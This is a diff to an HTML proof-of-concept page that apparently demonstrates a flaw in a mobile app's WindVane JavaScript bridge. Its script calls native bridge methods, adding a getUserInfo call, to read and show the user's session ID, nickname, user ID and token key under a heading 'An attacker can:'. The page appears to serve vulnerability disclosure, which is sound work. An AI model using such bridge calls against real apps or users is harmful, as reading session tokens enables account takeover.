@@ -50,8 +50,10 @@
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
     <p><span class="larger">Get Your Account Info:</span></p>
+    <p style="font-size: 15px;" id="NickName"></p>
+    <p style="font-size: 15px;" id="UserID"></p>
+    <p style="font-size: 15px;" id="Sid"></p>
     <p style="font-size: 15px;" id="TokenKey"></p>
-
 
     <p><span class="larger">Get Your Device Info:</span></p>
     <p style="font-size: 15px;" id="Wua"></p>
@@ -77,6 +79,12 @@
                 var json = response;
                 document.getElementById("TokenKey").innerText = "Your TokenKey: \n" + json.tokenKey;
             }
+            if (reqId == "$0004") {
+                var json = response;
+                document.getElementById("Sid").innerText = "Your SID: \n" + json.sid;
+                document.getElementById("NickName").innerText = "Your NickName: \n" + json.nick;
+                document.getElementById("UserID").innerText = "Your UserID: \n" + json.userId;
+            }
         }
 
         document.getElementById("LogOutBtn").onclick = function () {
@@ -99,6 +107,11 @@
             reqId: "$0003"
         });
 
+        window.webkit.messageHandlers.WindVaneCallNative.postMessage({
+            name: "aluWVJSBridge.getUserInfo",
+            params: "{}",
+            reqId: "$0004"
+        });
 
     </script>
 
